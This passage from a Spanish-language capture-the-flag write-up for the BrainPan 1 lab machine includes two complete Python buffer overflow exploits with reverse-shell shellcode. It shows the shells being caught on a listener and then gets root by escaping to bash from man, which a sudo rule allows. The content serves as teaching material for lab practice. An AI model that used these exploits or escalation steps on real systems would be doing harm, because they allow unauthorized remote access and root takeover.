    buf += b"\x30\x2f\x9c\xc8\x5d\xd0\x4b\x0e\x58\x53\x79\xef\x9f"
    buf += b"\x4b\x08\xea\xe4\xcb\xe1\x86\x75\xbe\x05\x34\x75\xeb"
    # Buffer
    junk = "A"*524
    # EIP en Little endian
    eip = "\xf3\x12\x17\x31" #311712F3
    # NOPS
    nops = "\x90" * 10
    # Resultado JUNK + EIP + NOPS + buf
    bof = junk + eip + nops + buf
    server_address = ('10.0.0.30',9999)
    try:
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect the socket to the port where the server is listening
        sock.settimeout(1)
        sock.connect(server_address)
        sock.send(bof)
        sock.close()
        p1.success("Cadena enviada")
        time.sleep(1)
    except Exception as e:
        log.error(str(e))
        sys.exit(1)

```

Si lo ejecutamos y nos ponemos en escucha por el puerto 443:

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.0.0.25] from (UNKNOWN) [10.0.0.30] 49768
Microsoft Windows [Versin 10.0.19044.1620]
(c) Microsoft Corporation. Todos los derechos reservados.

whoami
whoami
k4miwindows\k4miyo

C:\Users\k4miyo\Desktop>
```

Hemos ganado acceso a la máquina Windows de nosotros. Con este mismo principio, vamos a tratar de acceder a la máquina víctima cambiando el shellcode a Linux:

```python
#!/usr/bin/python
#coding:utf-8

import sys, socket, time, signal, argparse
from pwn import *

def def_handler(sig,frame):
    print "\n[!] Saliendo..."
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)


def makeRequest(rhost):
    p1 = log.progress("Buffer Overflow BrainPan 1 Vuln")
    p1.status("Generando variables necesarias para enviar al servidor %s" % rhost)
    time.sleep(1)
    # Shellcode
    # msfvenom -p linux/x86/shell_reverse_tcp --platform Linux -a x86 lhost=x.x.x.x lport=443 EXITFUNC=thread -f python -b "\x00"
    buf =  b""
    buf += b"\xd9\xf6\xb8\x1b\x8b\x39\xb9\xd9\x74\x24\xf4\x5a\x31"
    buf += b"\xc9\xb1\x12\x31\x42\x17\x03\x42\x17\x83\xf1\x77\xdb"
    buf += b"\x4c\x34\x53\xeb\x4c\x65\x20\x47\xf9\x8b\x2f\x86\x4d"
    buf += b"\xed\xe2\xc9\x3d\xa8\x4c\xf6\x8c\xca\xe4\x70\xf6\xa2"
    buf += b"\xfc\x82\x08\x2b\x69\x81\x08\x4a\xd2\x0c\xe9\xfc\x42"
    buf += b"\x5f\xbb\xaf\x39\x5c\xb2\xae\xf3\xe3\x96\x58\x62\xcb"
    buf += b"\x65\xf0\x12\x3c\xa5\x62\x8a\xcb\x5a\x30\x1f\x45\x7d"
    buf += b"\x04\x94\x98\xfe"
    # Buffer
    junk = "A"*524
    # EIP en Little endian
    eip = "\xf3\x12\x17\x31" #311712F3
    # NOPS
    nops = "\x90" * 10
    # Result JUNK + EIP + NOPS + SHELLCODE
    bof = junk + eip + nops + buf
    server_address = (rhost,9999)
    try:
        p1.status("Estableciendo conexión")
        time.sleep(1)
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect the socket to the port where the server is listening
        sock.settimeout(1)
        sock.connect(server_address)
        p1.status("Enviando el Buffer Overflow...")
        time.sleep(1)
        sock.send(bof)
        sock.close()
        p1.success("Ataque realizado con éxito")
        time.sleep(1)
    except Exception as e:
        log.error(str(e))
        sys.exit(1)

if __name__=='__main__':
    argparser = argparse.ArgumentParser(description='Buffer Overflow de la máquina BrainPan 1 VulnHub')
    argparser.add_argument('--rhost', type=str,
            help='Remote host ip (Victim)',
            required=True)
    args = argparser.parse_args()
    rhost = args.rhost
    makeRequest(rhost)

```

Nos ponemos en escucha por el puerto 443 y procedemos a ejecutarlo:

```bash
❯ python2 BrainPan1_BOF.py --rhost 10.0.0.32
[+] Buffer Overflow BrainPan 1 Vuln: Ataque realizado con éxito
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.0.0.25] from (UNKNOWN) [10.0.0.32] 48061
whoami
puck
```

Ya nos encontramos dentro de la máquina víctima como el usuario **puck** y para trabajar más cómodos vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty).  Vamos a enumerar un poco el sistema para ver de que forma podemos escalar privilegios:

```bash
puck@brainpan:/home/puck$ id 
uid=1002(puck) gid=1002(puck) groups=1002(puck)
puck@brainpan:/home/puck$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck$
```

Vemos que podemos ejecutar `/home/anansi/bin/anansi_util` como el usuario **root** sin proporcionar contraseña.

```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
puck@brainpan:/home/puck$
```

Si lo ejecutamos, vemos que nos pide algunos parámetros y uno que ya nos llama la atención es `manual` ya que podemos introducir un comando. Vamos a probar con un `whoami`:

```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual whoami
```

Se nos despliega el `man` del comando `whoami`; por lo tanto, podríamos tratar de desplegarnos una `/bin/bash` introduciendo el comando `!/bin/bash` sin salir del `man` del comando:

```bash
SEE ALSO
       The  full  documentation  for  whoami is maintained as a Texinfo manual.  If the info and whoami programs are properly
       installed at your site, the command

              info coreutils 'whoami invocation'

       should give you access to the complete manual.

GNU coreutils 8.12.197-032bb                            September 2011                                              WHOAMI(1)
 Manual page whoami(1) line 1/44 (END) (press h for help or q to quit)
!/bin/bash
```

```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual whoami
No manual entry for manual
root@brainpan:/usr/share/man# whoami
root
root@brainpan:/usr/share/man#
```

Ya somos el usuario **root**.
